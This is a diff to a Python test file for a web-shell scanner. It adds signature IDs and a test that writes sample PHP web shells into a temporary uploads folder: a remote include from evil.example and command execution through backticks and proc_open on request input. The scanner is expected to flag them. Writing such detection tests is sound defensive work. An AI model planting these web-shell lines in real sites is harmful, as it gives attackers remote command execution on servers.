@@ -22,6 +22,9 @@ def test_load_signature_pack_has_webshell_rule():
     assert "sinexis.php.eval_b64" in ids
     assert "sinexis.php.gzinflate_b64" in ids
     assert "sinexis.php.str_rot13_input" in ids
+    assert "sinexis.php.include_http" in ids
+    assert "sinexis.php.backtick_input" in ids
+    assert "sinexis.php.proc_open_input" in ids
 
 
 def test_scan_local_root_matches_eval_post(tmp_path: Path, monkeypatch: pytest.MonkeyPatch):
@@ -86,6 +89,24 @@ def test_scan_local_root_matches_obfuscation(tmp_path: Path, monkeypatch: pytest
     assert ("e.php", "sinexis.php.eval_b64") in ids
     assert ("g.php", "sinexis.php.gzinflate_b64") in ids
     assert ("r.php", "sinexis.php.str_rot13_input") in ids
+    assert not any(h["rel_path"].endswith("clean.php") for h in hits)
+
+
+def test_scan_local_root_matches_include_backtick_proc(tmp_path: Path, monkeypatch: pytest.MonkeyPatch):
+    monkeypatch.setattr(host_path, "ALLOWED_PREFIXES", (str(tmp_path),))
+    monkeypatch.setattr(host_engine, "validate_root_path", lambda p: str(Path(p)))
+    monkeypatch.setattr(host_engine, "jail_rel_path", lambda root, rel: str(Path(root) / rel))
+    uploads = tmp_path / "wp-content" / "uploads"
+    uploads.mkdir(parents=True)
+    (uploads / "i.php").write_text('<?php include("http://evil.example/x"); ?>', encoding="utf-8")
+    (uploads / "b.php").write_text("<?php echo `$_GET['c']`; ?>", encoding="utf-8")
+    (uploads / "p.php").write_text("<?php proc_open($_POST['c'], [], $p); ?>", encoding="utf-8")
+    (uploads / "clean.php").write_text("<?php echo 1; ?>", encoding="utf-8")
+    hits = scan_local_root(str(tmp_path))
+    ids = {(h["rel_path"].split("/")[-1], h["rule_id"]) for h in hits}
+    assert ("i.php", "sinexis.php.include_http") in ids
+    assert ("b.php", "sinexis.php.backtick_input") in ids
+    assert ("p.php", "sinexis.php.proc_open_input") in ids
     assert not any(h["rel_path"].endswith("clean.php") for h in hits)
 
 
